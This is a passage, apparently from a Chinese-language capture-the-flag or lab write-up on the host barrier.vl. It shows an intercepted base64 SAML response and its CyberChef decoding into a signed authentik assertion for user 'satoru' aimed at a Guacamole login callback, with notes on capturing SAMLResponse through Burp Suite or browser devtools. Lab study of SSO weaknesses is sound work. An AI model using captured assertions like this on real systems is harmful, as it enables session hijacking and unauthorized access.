FPREp2S1JQWmVyczlNZGVDTVdoNWNwNlFTQnROcDhaRU5hClVCYjFJT2psVVloWFMvNXV0RFJ2R3FkMEtHUVErUGhnc1JOL1QydkNIUk14ZDBwLzlhYWdVcVUxQlM5QWwyRWkKQ0VMMEFoK05WdE1vUmxueXFjYy9VWXBxS09sRzY2Y2Z5TkZBRkhQdHQ0dFJTR3dSWVdGSE94cURaNGdoL1h2RApoTTRxWk4wVFU1Wml0UVJlOWRGS3B0YmxmSkdOWlV3ZCtmY242Tit3YzdBPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BCjxkczpLZXlJbmZvPgo8ZHM6WDUwOURhdGE%2BCjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRlV6Q0NBenVnQXdJQkFnSVFLdFFTOTV6T1RpNlVoYjdPb21vNHREQU5CZ2txaGtpRzl3MEJBUXNGQURBZQpNUnd3R2dZRFZRUUREQk5oZFhSb1pXNTBhV3NnTWpBeU5DNHhNQzQxTUI0WERUSTBNVEl4TkRFMU16Z3dOMW9YCkRUSTFNVEl4TlRFMU16Z3dOMW93VmpFcU1DZ0dBMVVFQXd3aFlYVjBhR1Z1ZEdscklGTmxiR1l0YzJsbmJtVmsKSUVObGNuUnBabWxqWVhSbE1SSXdFQVlEVlFRS0RBbGhkWFJvWlc1MGFXc3hGREFTQmdOVkJBc01DMU5sYkdZdApjMmxuYm1Wa01JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBdzRTOEdHZjJ4MDdCCmlEeUZEM1RLSEdCOXRGbjBSSTBGZW1aYUNmQ3gyUlVXenFDVit5UHpCK2Z6QzFQZjhVTWdJUDhkZ2VabXAzSFEKRzNkanBwRGhpaitJK21FVHZMUWRTUWg4cms5eXRVTVcxZUxnTlR2TkVIMElIMXhFSkVjbUhPVFB3Y1NOcmV6awp5SW8wT1pXR0JGcDhWbDNnR3pMY2VKdXBkYXU5RlVZaVZPRzRwZVVkU2pyWVA2eExOOElQbzE2S2gxK2o4eEQrCmpaOE5xamt4L0dSNzBtZmdQanFTTzFFQUNqcEh5anpoc3J1SzQzZFR5Y0RieHFPb1kxM3BSckV4bzdVOVlsRU8KekZycHRlUDIxc0hMemQways4MENQcS9aUFdsWHNJYWZKMThKT0YrUVdDRDhLL0hGbWJDcDlpaGQzcFFTWnFrYQowSHgyelJGeXhCQkd3dG9Xdk9MV2srcStiYllMZFhZaVNYT0hhWnl4OGJQRjkzVTJxUFVEMFRkK0llUXA4dW54ClNycnVXVjcwTDVCdHMxaXk2Y1FtOHYvZjFSRi9RMHRRUHBnU0FhRy9oeGNTZ09BNHhMd0JYUjF5ZUduZldQM3cKVnVUclNJQVVPYnltK2dKQjRnR0hGUG1HZG55OVd0aE1RU2ViYnlCR0ZqSEJjbHF1V0FUNFRnN1RTR2cyNVNZawpGby9YWUhRNG0rVGJwSUE3UllzanJlQWtqNkhPQWFNOGdzdVg3cUhMZE43dzM0RzVsNGVYdmlQMG5GUG9KM1h2ClpDOWg2TnhDdXZxYUhFZkIrOStjZTJsaXVFOFlGWUFib1dKTFljTXJjK0JEdVQwR3Q1UlBzOEZVVUNndlUrUHAKT2lEQk90TFFtVzl6WENRNVNMYmRQVTNBbkVNYUp5c0NBd0VBQWFOVk1GTXdVUVlEVlIwUkFRSC9CRWN3UllKRApPVUpYY2toS2FGQmxNblJFUzNKTmMwNHlVemxKUTFScE1GcG5TMFJRU1ZoYVUxcERWV3hvWVM1elpXeG1MWE5wCloyNWxaQzVuYjJGMWRHaGxiblJwYXk1cGJ6QU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FnRUFyc2hJWDBmZWxzZWwKVDhEN2lleG5kbytzMjcyYTBpVk8vaFpRVTZqT1Brd2l5TTJnNUtyeEJLeldPQlRrdTN4bGtGL3FlZ3VrY1ZvaworRVlOWHVZdVJ5STlPRmZUWnp1RE5uTWtKeXl4ZDhWd2h3dDVOSlJMVVlKbFh1cEF2UHJrZjZUa2ZtQ0psR3lmCllQem1tZFBkWEhDRnRKeG15Sm9PMDB1TEl5KzAzRnZQRUExT2l3Q2lkOGFRY0ZBLzF1NUJUU2EzS1pCbzZCRkMKUWhOTC8reFhvK29NejFjWktFcjhoQzI4aVV4U3ZMZlFBdFhRdFBuOWdwMTV2TGw3WmZvUENGUkxnM0VEMXZvcApkakFuV0hjQ3MwSk9vWWxPdDlkWVNqdHVpRUl6TmtKaU01T2dlMjhPY0JZWVNYYjBldVlsanpUYnh6UG81S3Q3CmhDSEp6TmZYWGNrbExGaXJ5Q09MQjJFWm0zNklDdUJMVmJaaUFSeUhiOE9rUlFtN09vSi91dld1U2NIWG5MTzAKcFRTZjlzSDFTbURZR2prMy9QRGprSEhKQWRhRlEyMXVBQm5mSVdsbWpGNHN1VG1WSU1icnRVT3RoblJkcFgvZgpEZ0RiL1k1NTFqTGZYSDJZNy9PWGduZWh3L2FIdjl1NFRGNlRZcXBOd2RNdEdqQys5SUU3K3BLNkt3ay9LMHU3ClVNWE9kQllXWTRidkZwaE9XRDFzZ0hRWWRxMkFyWVBuRUtVb0x5bDN3a2FkTldyMlZVQ21ESkxDSTE3SDN4cnUKZnVyMTdrN3QxcE52VWFqVWVYcUJycWdmTHFWZlNPZ2tmUmhFU2lxVlZadlk1RXJaNUNRano5Y0lXeTJkM3hEdQpHbkEvNW1rTy8yWUROMy9OZTA1WG5mK01WQis4bnV3PQo8L2RzOlg1MDlDZXJ0aWZpY2F0ZT4KPC9kczpYNTA5RGF0YT4KPC9kczpLZXlJbmZvPgo8L2RzOlNpZ25hdHVyZT48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OnVuc3BlY2lmaWVkIj5zYXRvcnU8L3NhbWw6TmFtZUlEPjxzYW1sOlN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjYtMDMtMzBUMDc6NDE6NDNaIiBSZWNpcGllbnQ9Imh0dHA6Ly9iYXJyaWVyLnZsOjgwODAvZ3VhY2Ftb2xlL2FwaS9leHQvc2FtbC9jYWxsYmFjayIvPjwvc2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uPjwvc2FtbDpTdWJqZWN0PjxzYW1sOkNvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI2LTAzLTMwVDA3OjMxOjQzWiIgTm90T25PckFmdGVyPSIyMDI2LTAzLTMwVDA3OjQxOjQzWiIvPjxzYW1sOkF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyNi0wMy0zMFQwNzozMTo0M1oiIFNlc3Npb25JbmRleD0iYjY4YjE2Y2I4ODk2YjU4MzQ0MDU1MmU0YmI3MTBiNmQ1MTc5NWMzM2ZhMzA0MDg3M2YzOWQxNWY1YjA3NGRkNyIgU2Vzc2lvbk5vdE9uT3JBZnRlcj0iMjAyNi0wNS0yOVQwNzozNjo0M1oiPjxzYW1sOkF1dGhuQ29udGV4dD48c2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvc2FtbDpBdXRobkNvbnRleHRDbGFzc1JlZj48L3NhbWw6QXV0aG5Db250ZXh0Pjwvc2FtbDpBdXRoblN0YXRlbWVudD48c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPHNhbWw6QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLmdvYXV0aGVudGlrLmlvLzIwMjEvMDIvc2FtbC91c2VybmFtZSI%2BPHNhbWw6QXR0cmlidXRlVmFsdWU%2Bc2F0b3J1PC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU%2BPC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=minutes%3D-5
```
</details>

#### 可是我还是好纠结于它是POST请求
<details>
<summary>CyberChef,使用'From base64'</summary>

```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T07:36:43Z" Destination="http://barrier.vl:8080/guacamole/api/ext/saml/callback" ID="_599dc7b1c5ae4518a6f5a5f0f864daeb"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_daa86452ebe541b79e9b9cdf4e72ac0e" IssueInstant="2026-03-30T07:36:43Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="#_daa86452ebe541b79e9b9cdf4e72ac0e">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>kk6YNiIT/v00OMfCjUUkhUjRWT1qnXA571MIWnL2lTo=</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>qAn1ilf4IeYpYS+dFLGdIGE70g2ecqk34JpEwP0f4hUnTYoiX4VYygLF1H6oxIPS
2yFdZH1OIZVcnwO+NmDlUOwkw0g4mHbks99hzgugc5vbnCkik/btAx7IjT3K0Ju+
vDv76Aok9LiH3dSL1EZADw14wLSj37Nt9U2T4hFXa1zFXSGzZ7D6aWlCWvpRq8t4
FUyeksrGPJt9voH3foCqqUcQh5Jc400bxLraSSnpL7CrLP8mV3OKFaNeHmlma7qC
ho8qi2e/QRD1nup+D6lve/1RgX8WGhMNEP+Jsrl4nAZQlum4XAbAHopKApmrK6f9
sB0tT1AnQe1SSC6UmdNcriZjekVM1ARlESWuYjKTmTBjmz+x5FugKqfrfyib5J6y
ESDg9Ji8tgjayk9IF79r14AWffQzT1DfM5tiIwEhYX9RJcMU17sMg9IcK5O7PZ/T
I2+2f5/5fyySwfNWNd94KMHwQCRlHAODJvKRPZers9MdeCMWh5cp6QSBtNp8ZENa
UBb1IOjlUYhXS/5utDRvGqd0KGQQ+PhgsRN/T2vCHRMxd0p/9aagUqU1BS9Al2Ei
CEL0Ah+NVtMoRlnyqcc/UYpqKOlG66cfyNFAFHPtt4tRSGwRYWFHOxqDZ4gh/XvD
hM4qZN0TU5ZitQRe9dFKptblfJGNZUwd+fcn6N+wc7A=</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T07:41:43Z" Recipient="http://barrier.vl:8080/guacamole/api/ext/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T07:31:43Z" NotOnOrAfter="2026-03-30T07:41:43Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T07:31:43Z" SessionIndex="b68b16cb8896b583440552e4bb710b6d51795c33fa3040873f39d15f5b074dd7" SessionNotOnOrAfter="2026-05-29T07:36:43Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.goauthentik.io/2021/02/saml/username"><saml:AttributeValue>satoru</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>EéZÉ+Zµ&{­z9
```
</details>

#### 使用burpsuite好难拦截到GET的SAMLResponse，但是网页上的Fn12就很简单就有了SAMLResponse了
